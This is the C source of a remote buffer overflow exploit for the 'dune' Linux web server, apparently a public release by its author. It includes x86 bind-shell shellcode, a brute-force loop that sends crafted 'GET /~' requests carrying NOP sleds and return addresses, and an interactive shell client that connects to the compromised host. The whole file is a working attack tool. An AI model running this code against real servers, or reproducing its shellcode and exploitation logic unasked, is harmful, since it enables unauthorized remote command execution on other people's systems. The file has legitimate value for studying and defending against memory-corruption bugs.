/*[ dune[0.6.7+-]: remote buffer overflow exploit. ]*
 * by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo) *
 *                                                  *
 * dune is a httpd webserver for linux, which can   *
 * be found at:                                     *
 *  http://www.freshmeat.net/projects/dune          *
 *                                                  *
 * i originally made a proof of concept(broken)     *
 * exploit for it a couple years ago.  but, i       *
 * decided to finally make a working exploit for    *
 * it.  probably the most easy-to-use exploit i've  *
 * ever made.  the brute force method will allow    *
 * the exploit to work out of the box, on linux.    *
 *                                                  *
 * this exploit exploits the "multiuser" feature of *
 * dune.  the request sent will look like:          *
 *  "GET /~[48 bytes/overflow] [shellcode]\n\n"     *
 * the shellcode is placed where "HTTP/?.?" would   *
 * normally go.  but, dune doesn't seem to care.    *
 * if it is placed elsewhere alot of characters     *
 * will get truncated/passed to different           *
 * functions.                                       *
 *                                                  *
 * one problem though.  because of this:            *
 *  main.c:185:if(buffer[0]==EOF) exit(0);          *
 *  main.c:203:if(buffer[0]==EOF) exit(0);          *
 * no 0xff's can be sent to the server, for this to *
 * work.  but, i've made the exploit to work around *
 * the problem.                                     *
 *                                                  *
 * note: dune does drop privileges(uid/gid), if     *
 * started as root.  but, does not initgroups()     *
 * accordingly.                                     *
 ****************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#define BASE_ADDR 0x08048001 /* start brute. */
#define END_ADDR 0x0804ffff /* end brute. */
#define TIMEOUT 15 /* connection timeout. */
static char x86_exec[]= /* modded from netric folk. */
 "\x31\xc0\x50\x40\x89\xc3\x50\x40\x50\x89\xe1\xb0\x66"
 "\xcd\x80\x31\xd2\x52\x66\x68\x00\x00\x43\x66\x53\x89"
 "\xe1\x6a\x10\x51\x50\x89\xe1\xb0\x66\xcd\x80\x40\x89"
 "\x44\x24\x04\x43\x43\xb0\x66\xcd\x80\x83\xc4\x0c\x52"
 "\x52\x43\xb0\x66\xcd\x80\x93\x89\xd1\xb0\x3f\xcd\x80"
 "\x41\x80\xf9\x03\x75\xf6\x52\x68\x6e\x2f\x73\x68\x68"
 "\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd"
 "\x80";
char *getbuf(unsigned long);
void getshell(char *,unsigned short,unsigned long);
void request_url(char *hostname,unsigned short port,
unsigned long);
void printe(char *,short);
void sig_alarm(){printe("alarm/timeout hit",1);}
int main(int argc,char **argv){
 unsigned short port=80; /* default. */
 unsigned short sport=7979; /* default. */
 unsigned long ret=0;
 printf("[*] dune[0.6.7+-]: remote buffer overflow exp"
 "loit.\n[*] by: vade79/v9 v9@fakehalo.deadpig.org (fa"
 "kehalo)\n\n");
 if(argc<2){
  printf("[!] syntax: %s <hostname> [port] [offset] [s"
  "hell port]\n\n",argv[0]);
  exit(1);
 }
 if(argc>2)
  port=atoi(argv[2]);
 if(argc>3)
  ret=atoi(argv[3]);
 if(argc>4)
  sport=atoi(argv[4]);
 /* check for 0x0 and 0xff, can't use them. */
 if(((sport&0xff00)>>8)==0xff||(sport&0x00ff)==0xff||
 !((sport&0xff00)>>8)||!(sport&0x00ff)){
  printf("[!] shell port defined contains bad characte"
  "r(s), using default.\n");
  sport=7979; /* back to default. */
 }
 /* add port dealio. */
 x86_exec[20]=(sport&0xff00)>>8;
 x86_exec[21]=(sport&0x00ff);
 printf(" target:%s:%d addresses:0x%.8x(+%ld)-0x%.8x"
 "\n\n",argv[1],port,BASE_ADDR,ret,END_ADDR);
 fprintf(stderr,"[. = 350 byte offset]: ");
 while((BASE_ADDR+ret)<END_ADDR){
  /* make sure its a usable address. */
  if(!(BASE_ADDR+(ret&0x000000ff)))
   ret--;
  if((BASE_ADDR+(ret&0x000000ff))==0xff)
   ret--;
  request_url(argv[1],port,(BASE_ADDR+ret));
  sleep(1);
  getshell(argv[1],sport,ret);
  ret+=350; /* number of nops. */
 }
 fprintf(stderr,"(hit memory limit, aborting)\n\n");
 exit(0);
}
/* layout: "GET /~[addr*12] [shellcode]\n\n". */
char *getbuf(unsigned long addr){
 unsigned int i=0;
 char *buf;
 if(!(buf=(char *)malloc(500+1)))
  printe("getbuf(): allocating memory failed",1);
 memset(buf,0x0,501);
 strcpy(buf,"GET /~");
 for(i=6;i<(48+6);i+=4){*(long *)&buf[i]=addr;}
 buf[i++]=0x20; /* space. */
 memset(buf+i,0x90,(500-strlen(x86_exec)-i-2));
 memcpy(buf+(500-strlen(x86_exec)-2),x86_exec,
 strlen(x86_exec));
 strcpy(buf+strlen(buf),"\n\n");
 return(buf);
}
void getshell(char *hostname,unsigned short port,
unsigned long offset){
 int sock,r;
 fd_set fds;
 char buf[4096];
 struct hostent *he;
 struct sockaddr_in sa;
 if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))
 ==-1)
  printe("getshell() socket failed",1);
 sa.sin_family=AF_INET;
 if((sa.sin_addr.s_addr=inet_addr(hostname))){
  if(!(he=gethostbyname(hostname)))
   printe("couldn't resolve hostname",1);
  memcpy((char *)&sa.sin_addr,(char *)he->h_addr,
  sizeof(sa.sin_addr));
 }
 sa.sin_port=htons(port);
 signal(SIGALRM,sig_alarm);
 alarm(TIMEOUT);
 if(connect(sock,(struct sockaddr *)&sa,sizeof(sa))){
  fprintf(stderr,".");
  close(sock);
  return;
 }
 alarm(0);
 fprintf(stderr,"(hit shellcode at 0x%.8x(+%ld))\n\n",
 BASE_ADDR,offset);
 signal(SIGINT,SIG_IGN);
 write(sock,"uname -a;id\n",13);
 while(1){
  FD_ZERO(&fds);
  FD_SET(0,&fds);
  FD_SET(sock,&fds);
  if(select(sock+1,&fds,0,0,0)<1){
   printe("getshell(): select() failed",0);
   return;
  }
  if(FD_ISSET(0,&fds)){
   if((r=read(0,buf,sizeof(buf)))<1){
    printe("getshell(): read() failed",0);
    return;
   }
   if(write(sock,buf,r)!=r){
    printe("getshell(): write() failed",0);
    return;
   }
  }
  if(FD_ISSET(sock,&fds)){
   if((r=read(sock,buf,sizeof(buf)))<1)
    exit(0);
   write(1,buf,r);
  }
 }
 close(sock);
 return;
}
void request_url(char *hostname,unsigned short port,
unsigned long ret){
 int sock;
 char *ptr;
 struct hostent *t;
 struct sockaddr_in s;
 sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
 s.sin_family=AF_INET;
 s.sin_port=htons(port);
 if((s.sin_addr.s_addr=inet_addr(hostname))){
  if(!(t=gethostbyname(hostname)))
   printe("couldn't resolve hostname",1);
  memcpy((char*)&s.sin_addr,(char*)t->h_addr,
  sizeof(s.sin_addr));
 }
 signal(SIGALRM,sig_alarm);
 alarm(TIMEOUT);
 if(connect(sock,(struct sockaddr *)&s,sizeof(s)))
  printe("connection failed",1);
 alarm(0);
 ptr=getbuf(ret);
 write(sock,ptr,strlen(ptr));
 close(sock);
 return;
}
void printe(char *err,short e){
 fprintf(stderr,"(error: %s)\n\n",err);
 if(e)
  exit(1);
 return;
}
